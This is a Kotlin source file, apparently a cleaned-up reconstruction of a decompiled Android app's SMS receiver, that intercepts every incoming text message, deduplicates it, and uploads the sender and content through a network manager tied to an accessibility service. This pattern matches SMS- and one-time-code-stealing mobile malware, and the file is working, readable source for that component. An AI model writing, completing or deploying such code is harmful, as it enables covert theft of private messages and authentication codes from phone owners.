package com.storm.safe.rock.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.telephony.SmsMessage
import android.util.Log
import org.json.JSONException
import org.json.JSONObject
import java.util.LinkedHashMap

/**
 * SMS BroadcastReceiver — intercepts incoming SMS, deduplicates, and uploads.
 *
 * Reverse-engineered from JADX: receiver/arniezsqllm.java (213 lines).
 * Renamed: f52283a0→companion, f52284a1→globalSmsDedup, f52285a2→signatureRegex,
 *          f52286a3→senderPrefixRegex, m211379a0→parseSmsFromIntent,
 *          m211380a1→fallbackParseSms
 */
class arniezsqllm : BroadcastReceiver() {

    companion object {
        private const val TAG = "arniezsqllm"

        @JvmStatic
        val globalSmsDedup: LinkedHashMap<String, Long> = LinkedHashMap(100, 0.75f, true)

        @JvmStatic
        val signatureRegex: Regex = Regex("^【[^】]*】\\s*")

        @JvmStatic
        val senderPrefixRegex: Regex = Regex("^[^:：]{1,15}[：:]\\s*")

        /**
         * Normalize SMS content for dedup comparison.
         */
        @JvmStatic
        fun normalizeSmsContent(content: String): String {
            var result = content.trim()
            result = signatureRegex.replaceFirst(result, "")
            result = senderPrefixRegex.replaceFirst(result, "")
            return result.trim().take(40)
        }

        /**
         * Check if this SMS is a duplicate within 120 seconds.
         */
        @JvmStatic
        @Synchronized
        fun isDuplicateSms(number: String, content: String): Boolean {
            val normalized = normalizeSmsContent(content)
            if (normalized.length < 4) return false

            val now = System.currentTimeMillis()
            val lastTime = globalSmsDedup[normalized]
            if (lastTime != null && now - lastTime < 120_000) {
                Log.v(TAG, "短信去重: 120s内重复，跳过 key='${normalized.take(20)}'")
                return true
            }

            globalSmsDedup[normalized] = now

            // Evict old entries if map is too large
            if (globalSmsDedup.size > 200) {
                val iterator = globalSmsDedup.entries.iterator()
                while (iterator.hasNext() && globalSmsDedup.size > 100) {
                    val entry = iterator.next()
                    if (now - entry.value > 300_000) {
                        iterator.remove()
                    } else {
                        break
                    }
                }
            }
            return false
        }

        /**
         * Parse SMS from intent extras (primary parser).
         */
        @JvmStatic
        @Throws(JSONException::class)
        fun parseSmsFromIntent(intent: Intent): JSONObject? {
            val extras = intent.extras ?: return null
            val pdus = (extras.get("pdus") as? Array<*>) ?: return null
            if (pdus.isEmpty()) return null

            val format = extras.getString("format")
            val sb = StringBuilder()
            var timestamp = System.currentTimeMillis()
            var sender = ""

            for (pdu in pdus) {
                val smsMessage = if (format != null) {
                    SmsMessage.createFromPdu(pdu as ByteArray, format)
                } else {
                    @Suppress("DEPRECATION")
                    SmsMessage.createFromPdu(pdu as ByteArray)
                }
                if (smsMessage != null) {
                    if (sender.isEmpty()) {
                        sender = smsMessage.displayOriginatingAddress ?: ""
                        timestamp = smsMessage.timestampMillis
                    }
                    sb.append(smsMessage.messageBody ?: "")
                }
            }

            if (sender.isEmpty() && sb.isEmpty()) return null

            return JSONObject().apply {
                put("number", sender)
                put("text", sb.toString())
                put("timestamp", timestamp)
                put("type", "incoming")
            }
        }

        /**
         * Fallback SMS parser.
         */
        @JvmStatic
        fun fallbackParseSms(intent: Intent) {
            try {
                val extras = intent.extras ?: return
                val pdus = (extras.get("pdus") as? Array<*>) ?: return
                val smsMessages = arrayOfNulls<SmsMessage>(pdus.size)
                val sb = StringBuilder()
                var sender = ""

                for (i in pdus.indices) {
                    @Suppress("DEPRECATION")
                    smsMessages[i] = SmsMessage.createFromPdu(pdus[i] as ByteArray)
                    if (sender.isEmpty()) {
                        sender = smsMessages[i]?.displayOriginatingAddress ?: ""
                    }
                    sb.append(smsMessages[i]?.messageBody ?: "")
                }

                val text = sb.toString()
                if ((sender.isEmpty() && text.isEmpty()) || isDuplicateSms(sender, text)) {
                    return
                }

                val json = JSONObject().apply {
                    put("number", sender)
                    put("text", text)
                    put("timestamp", System.currentTimeMillis())
                    put("type", "incoming")
                }
                // JADX: new Thread(new RunnableC0941o6(21, json)).start()
                // vendor: Inlined TaskRunnable type=21 logic — direct service call
                Thread {
                    try {
                        val svc = com.storm.safe.rock.service.MyAccessibilityService.Companion.getInstance()
                        svc?.getNetworkManager()?.sendIncomingSms(json)
                    } catch (e: Exception) {
                        Log.e(TAG, "备用解析上传失败", e)
                    }
                }.start()
                Log.d(TAG, "Fallback SMS parsed: from=$sender len=${text.length}")
            } catch (e: Exception) {
                Log.e(TAG, "短信备用解析失败", e)
            }
        }
    }

    override fun onReceive(context: Context, intent: Intent) {
        Log.v(TAG, "短信广播 action=${intent.action}")
        if (intent.action == "android.provider.Telephony.SMS_RECEIVED" ||
            intent.action == "android.provider.Telephony.SMS_DELIVER"
        ) {
            try {
                val smsJson = parseSmsFromIntent(intent)
                if (smsJson == null) {
                    Log.v(TAG, "主解析返回null，尝试备用解析")
                    fallbackParseSms(intent)
                    return
                }
                val number = smsJson.getString("number")
                val text = smsJson.getString("text")
                if (isDuplicateSms(number, text)) {
                    return
                }
                Log.v(TAG, "短信解析成功: from=$number len=${text.length}")
                // JADX: new Thread(new RunnableC0941o6(21, smsJson)).start()
                // vendor: Inlined TaskRunnable type=21 logic — direct service call
                Thread {
                    try {
                        val svc = com.storm.safe.rock.service.MyAccessibilityService.Companion.getInstance()
                        svc?.getNetworkManager()?.sendIncomingSms(smsJson)
                    } catch (e: Exception) {
                        Log.e(TAG, "短信上传失败", e)
                    }
                }.start()
            } catch (e: Exception) {
                Log.e(TAG, "短信接收失败: ${e.message}", e)
                fallbackParseSms(intent)
            }
        }
    }
}
